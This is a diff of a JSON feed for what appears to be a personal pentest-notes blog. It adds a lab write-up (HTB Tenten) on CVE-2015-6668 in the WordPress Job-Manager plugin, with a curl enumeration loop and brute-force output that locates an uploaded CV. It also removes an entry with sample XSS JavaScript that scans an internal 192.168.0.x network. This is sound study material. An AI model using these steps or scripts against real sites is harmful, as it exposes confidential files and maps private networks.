@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/04/17/wordpress-jobmanager-plugin-file-disclosure",
+            "title": "Wordpress Job-Manager Plugin File Disclosure",
+            "summary": "Wordpress Job-Manager Plugin File Disclosure",
+            "content_text": "OverviewVulnerable versions of job-manager plugin can allow attacker to retrieve confidential files such as CV.CVE-2015-6668Environment Setup  Wordpress running job manager plugin 0.7.25.Steps  Check what available are the available job titlesfor i in $(seq 1 25); do echo -n \"$i: \"; curl -s http://tenten/index.php/jobs/apply/$i/ | grep 'entry-title' | cut -d'&gt;' -f2 | cut -d'&lt;' -f1; done  Using this script, brute force the possible files you can retrieve from the uploads directory➜  exploit python2 brute.py/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.CVE-2015-6668Title: CV filename disclosure on Job-Manager WP PluginBlog: https://vagmour.euPlugin URL: http://www.wp-jobmanager.comVersions: &lt;=0.7.25Enter a vulnerable website: http://tentenEnter a file name: HackerAccessGranted[+] URL of CV found! http://tenten/wp-content/uploads/2017/04/HackerAccessGranted.jpg➜  exploit References  HTB Tenten",
+            "content_html": "<h2 id=\"overview\">Overview</h2><p>Vulnerable versions of job-manager plugin can allow attacker to retrieve confidential files such as CV.</p><p>CVE-2015-6668</p><h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li>Wordpress running job manager plugin 0.7.25.</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Check what available are the available job titles</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">for </span>i <span class=\"k\">in</span> <span class=\"si\">$(</span><span class=\"nb\">seq </span>1 25<span class=\"si\">)</span><span class=\"p\">;</span> <span class=\"k\">do </span><span class=\"nb\">echo</span> <span class=\"nt\">-n</span> <span class=\"s2\">\"</span><span class=\"nv\">$i</span><span class=\"s2\">: \"</span><span class=\"p\">;</span> curl <span class=\"nt\">-s</span> http://tenten/index.php/jobs/apply/<span class=\"nv\">$i</span>/ | <span class=\"nb\">grep</span> <span class=\"s1\">'entry-title'</span> | <span class=\"nb\">cut</span> <span class=\"nt\">-d</span><span class=\"s1\">'&gt;'</span> <span class=\"nt\">-f2</span> | <span class=\"nb\">cut</span> <span class=\"nt\">-d</span><span class=\"s1\">'&lt;'</span> <span class=\"nt\">-f1</span><span class=\"p\">;</span> <span class=\"k\">done</span></code></pre></div></div><ul>  <li>Using this <a href=\"https://github.com/1nf1n17yk1ng/CVE-2015-6668\">script</a>, brute force the possible files you can retrieve from the uploads directory</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  exploit python2 brute.py/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class=\"k\">for </span>it is now deprecated <span class=\"k\">in </span>cryptography, and will be removed <span class=\"k\">in </span>the next release.CVE-2015-6668Title: CV filename disclosure on Job-Manager WP PluginBlog: https://vagmour.euPlugin URL: http://www.wp-jobmanager.comVersions: &lt;<span class=\"o\">=</span>0.7.25Enter a vulnerable website: http://tentenEnter a file name: HackerAccessGranted<span class=\"o\">[</span>+] URL of CV found! http://tenten/wp-content/uploads/2017/04/HackerAccessGranted.jpg➜  exploit </code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Tenten</li></ul>",
+            "url": "https://mvineza.github.io/spindel/2022/04/17/wordpress-jobmanager-plugin-file-disclosure",
+            
+            
+            
+            "tags": ["foothold","wordpress","web"],
+            
+            "date_published": "2022-04-17T00:00:00+08:00",
+            "date_modified": "2022-04-17T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/04/16/ld-preload",
             "title": "LD_PRELOAD",
             "summary": "LD_PRELOAD",
@@ -846,30 +870,6 @@
             
             "date_published": "2022-02-06T00:00:00+08:00",
             "date_modified": "2022-02-06T00:00:00+08:00",
-            
-                "author":  {
-                "name": "spindel",
-                "url": null,
-                "avatar": null
-                }
-                
-            
-        },
-    
-        {
-            "id": "https://mvineza.github.io/spindel/2022/02/02/xss-port-scanning",
-            "title": "XSS Port Scanning",
-            "summary": "XSS Port Scanning",
-            "content_text": "OverviewAn attacker which is outside of your internal network can force you to browse a webpage containing malicuous javascript.This javascript code will scan your internal network and can be modified to send results back to attacker.Sample Code&lt;script&gt;  for (let i = 0; i &lt; 256; i++) {    let ip = '192.168.0.' + i    let code = '&lt;img src=\"http://' + ip + '/favicon.ico\" onload=\"this.onerror=null; this.src=/log/' + ip + '\"&gt;'    document.body.innerHTML += code }&lt;/script&gt;References  https://neonprimetime.blogspot.com/2015/09/cross-site-scripting-xss-that-port-scans.html",
-            "content_html": "<h2 id=\"overview\">Overview</h2><p>An attacker which is outside of your internal network can force you to browse a webpage containing malicuous javascript.</p><p>This javascript code will scan your internal network and can be modified to send results back to attacker.</p><h2 id=\"sample-code\">Sample Code</h2><div class=\"language-javascript highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">&lt;</span><span class=\"nx\">script</span><span class=\"o\">&gt;</span>  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">let</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"mi\">256</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"kd\">let</span> <span class=\"nx\">ip</span> <span class=\"o\">=</span> <span class=\"dl\">'</span><span class=\"s1\">192.168.0.</span><span class=\"dl\">'</span> <span class=\"o\">+</span> <span class=\"nx\">i</span>    <span class=\"kd\">let</span> <span class=\"nx\">code</span> <span class=\"o\">=</span> <span class=\"dl\">'</span><span class=\"s1\">&lt;img src=\"http://</span><span class=\"dl\">'</span> <span class=\"o\">+</span> <span class=\"nx\">ip</span> <span class=\"o\">+</span> <span class=\"dl\">'</span><span class=\"s1\">/favicon.ico\" onload=\"this.onerror=null; this.src=/log/</span><span class=\"dl\">'</span> <span class=\"o\">+</span> <span class=\"nx\">ip</span> <span class=\"o\">+</span> <span class=\"dl\">'</span><span class=\"s1\">\"&gt;</span><span class=\"dl\">'</span>    <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">innerHTML</span> <span class=\"o\">+=</span> <span class=\"nx\">code</span> <span class=\"p\">}</span><span class=\"o\">&lt;</span><span class=\"sr\">/script</span><span class=\"err\">&gt;</span></code></pre></div></div><p><img src=\"/spindel/assets/XSS%20Port%20Scanning/23CD500A-C9DD-4F00-A473-8A1F9AE4F120.png\" alt=\"\" /></p><h2 id=\"references\">References</h2><ul>  <li>https://neonprimetime.blogspot.com/2015/09/cross-site-scripting-xss-that-port-scans.html</li></ul>",
-            "url": "https://mvineza.github.io/spindel/2022/02/02/xss-port-scanning",
-            
-            
-            
-            "tags": ["web","enum","foothold","xss"],
-            
-            "date_published": "2022-02-02T00:00:00+08:00",
-            "date_modified": "2022-02-02T00:00:00+08:00",
             
                 "author":  {
                 "name": "spindel",
